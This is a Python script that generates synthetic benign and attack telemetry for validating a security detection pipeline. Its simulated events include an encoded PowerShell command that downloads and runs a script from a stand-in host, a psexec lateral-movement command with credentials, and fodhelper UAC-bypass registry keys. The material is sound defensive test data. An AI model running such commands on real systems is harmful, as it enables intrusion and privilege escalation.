#!/usr/bin/env python3
"""
Realistic Data Generator for JanuSec Platform Validation

Generates actual attack scenarios and benign traffic to test the 9-stage pipeline
"""

import json
import time
import random
import base64
from datetime import datetime, timedelta

class RealisticDataGenerator:
    def __init__(self):
        self.benign_processes = [
            {"proc": "chrome.exe", "parent": "explorer.exe", "ports": [80, 443]},
            {"proc": "outlook.exe", "parent": "explorer.exe", "ports": [993, 587]},
            {"proc": "teams.exe", "parent": "explorer.exe", "ports": [443, 80]},
            {"proc": "notepad.exe", "parent": "explorer.exe", "ports": []},
            {"proc": "calc.exe", "parent": "explorer.exe", "ports": []},
        ]

        self.attack_scenarios = {
            "macro_attack": {
                "description": "Office macro spawning PowerShell",
                "confidence_expected": 0.85,
                "stages_triggered": [1, 2, 3, 4, 8, 9]
            },
            "c2_beacon": {
                "description": "C2 beaconing to external IP",
                "confidence_expected": 0.90,
                "stages_triggered": [1, 2, 6, 7, 8]
            },
            "lateral_movement": {
                "description": "Internal reconnaissance and lateral movement",
                "confidence_expected": 0.75,
                "stages_triggered": [1, 3, 4, 5, 8]
            },
            "dns_tunneling": {
                "description": "DNS tunneling and data exfiltration",
                "confidence_expected": 0.80,
                "stages_triggered": [1, 2, 6, 8, 9]
            },
            "privilege_escalation": {
                "description": "UAC bypass and privilege escalation",
                "confidence_expected": 0.88,
                "stages_triggered": [1, 2, 3, 4, 7]
            }
        }

    def generate_benign_traffic(self, count=100):
        """Generate realistic benign network and process events"""
        events = []

        for i in range(count):
            proc_info = random.choice(self.benign_processes)
            event = {
                "id": f"benign-{i:04d}-{int(time.time())}",
                "timestamp": datetime.now().isoformat(),
                "host": f"DESKTOP-{random.randint(100, 999)}",
                "event_type": "process_start",
                "proc_name": proc_info["proc"],
                "parent_proc": proc_info["parent"],
                "user": f"user{random.randint(1, 10)}",
                "tags": ["benign", "normal_operations"],
                "confidence_expected": random.uniform(0.05, 0.15)
            }

            # Add network activity for some processes
            if proc_info["ports"] and random.random() > 0.3:
                event.update({
                    "dest_ip": random.choice(["8.8.8.8", "1.1.1.1", "208.67.222.222"]),
                    "dest_port": random.choice(proc_info["ports"]),
                    "proto": "tcp",
                    "bytes_sent": random.randint(100, 5000),
                    "bytes_received": random.randint(500, 10000)
                })

            events.append(event)

        return events

    def generate_macro_attack(self):
        """Generate Office macro attack scenario"""
        return {
            "id": f"attack-macro-{int(time.time())}",
            "timestamp": datetime.now().isoformat(),
            "host": "VICTIM-PC-01",
            "event_type": "process_start",
            "proc_name": "powershell.exe",
            "parent_proc": "winword.exe",  # Office Word
            "command_line": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand " +
                          base64.b64encode(b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')").decode(),
            "user": "victim_user",
            "dest_ip": "203.0.113.45",  # External malicious IP
            "dest_port": 443,
            "proto": "tcp",
            "tags": ["attack", "macro", "powershell"],
            "confidence_expected": 0.85,
            "attack_type": "macro_attack"
        }

    def generate_c2_beacon(self):
        """Generate C2 beaconing scenario"""
        return {
            "id": f"attack-beacon-{int(time.time())}",
            "timestamp": datetime.now().isoformat(),
            "host": "COMPROMISED-WS",
            "event_type": "network_connection",
            "proc_name": "svchost.exe",  # Process injection
            "dest_ip": "198.51.100.10",  # Known bad IP
            "dest_port": 8080,
            "proto": "tcp",
            "duration": 300,  # Long duration
            "bytes_sent": 64,   # Small, regular packets
            "bytes_received": 32,
            "connection_frequency": 60,  # Every 60 seconds
            "tags": ["attack", "c2", "beacon"],
            "confidence_expected": 0.90,
            "attack_type": "c2_beacon"
        }

    def generate_dns_tunneling(self):
        """Generate DNS tunneling scenario"""
        domains = [
            f"data{random.randint(1000, 9999)}.tunnel.evil.com",
            f"{base64.b64encode(b'exfiltrated_data').decode()[:8]}.malware.net",
            f"cmd{random.randint(100, 999)}.backdoor.org"
        ]

        return {
            "id": f"attack-dns-{int(time.time())}",
            "timestamp": datetime.now().isoformat(),
            "host": "DATA-SERVER-01",
            "event_type": "dns_query",
            "proc_name": "malware.exe",
            "dns_query": random.choice(domains),
            "dns_query_type": "TXT",
            "dns_response_size": random.randint(200, 500),  # Unusually large
            "query_frequency": 5,  # High frequency
            "dest_ip": "8.8.8.8",
            "tags": ["attack", "dns_tunneling", "exfiltration"],
            "confidence_expected": 0.80,
            "attack_type": "dns_tunneling"
        }

    def generate_lateral_movement(self):
        """Generate lateral movement scenario"""
        return {
            "id": f"attack-lateral-{int(time.time())}",
            "timestamp": datetime.now().isoformat(),
            "host": "PIVOTING-HOST",
            "event_type": "process_start",
            "proc_name": "psexec.exe",
            "command_line": "psexec.exe \\\\192.168.1.50 -u admin -p password123 cmd.exe",
            "parent_proc": "cmd.exe",
            "user": "compromised_admin",
            "dest_ip": "192.168.1.50",  # Internal target
            "dest_port": 445,  # SMB
            "proto": "tcp",
            "auth_attempts": 3,  # Multiple auth attempts
            "tags": ["attack", "lateral_movement", "psexec"],
            "confidence_expected": 0.75,
            "attack_type": "lateral_movement"
        }

    def generate_privilege_escalation(self):
        """Generate privilege escalation scenario"""
        return {
            "id": f"attack-privesc-{int(time.time())}",
            "timestamp": datetime.now().isoformat(),
            "host": "TARGET-WORKSTATION",
            "event_type": "process_start",
            "proc_name": "fodhelper.exe",  # UAC bypass technique
            "command_line": "fodhelper.exe",
            "parent_proc": "malware.exe",
            "user": "standard_user",
            "integrity_level": "High",  # Escalated privileges
            "registry_writes": [
                "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command",
                "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\DelegateExecute"
            ],
            "tags": ["attack", "privilege_escalation", "uac_bypass"],
            "confidence_expected": 0.88,
            "attack_type": "privilege_escalation"
        }

    def generate_mixed_dataset(self, benign_count=200, attack_count=50):
        """Generate mixed dataset with realistic proportions"""
        dataset = {
            "metadata": {
                "generated_at": datetime.now().isoformat(),
                "benign_events": benign_count,
                "attack_events": attack_count,
                "total_events": benign_count + attack_count,
                "attack_types": list(self.attack_scenarios.keys())
            },
            "events": []
        }

        # Generate benign traffic (80%)
        benign_events = self.generate_benign_traffic(benign_count)
        dataset["events"].extend(benign_events)

        # Generate attack scenarios (20%)
        attack_generators = [
            self.generate_macro_attack,
            self.generate_c2_beacon,
            self.generate_dns_tunneling,
            self.generate_lateral_movement,
            self.generate_privilege_escalation
        ]

        for i in range(attack_count):
            attack_event = random.choice(attack_generators)()
            dataset["events"].append(attack_event)

        # Shuffle to simulate real-world timing
        random.shuffle(dataset["events"])

        return dataset

    def save_dataset(self, dataset, filename):
        """Save dataset to JSON file"""
        with open(filename, 'w') as f:
            json.dump(dataset, f, indent=2)

        print(f"Dataset saved to {filename}")
        print(f"Events: {len(dataset['events'])}")
        print(f"Benign: {dataset['metadata']['benign_events']}")
        print(f"Attacks: {dataset['metadata']['attack_events']}")

def main():
    generator = RealisticDataGenerator()

    # Generate different sized datasets
    datasets = [
        {"name": "small_test", "benign": 100, "attack": 25},
        {"name": "medium_test", "benign": 500, "attack": 125},
        {"name": "large_test", "benign": 2000, "attack": 500}
    ]

    for ds_config in datasets:
        print(f"\nGenerating {ds_config['name']} dataset...")
        dataset = generator.generate_mixed_dataset(
            benign_count=ds_config["benign"],
            attack_count=ds_config["attack"]
        )

        filename = f"test_data_{ds_config['name']}.json"
        generator.save_dataset(dataset, filename)

if __name__ == "__main__":
    main()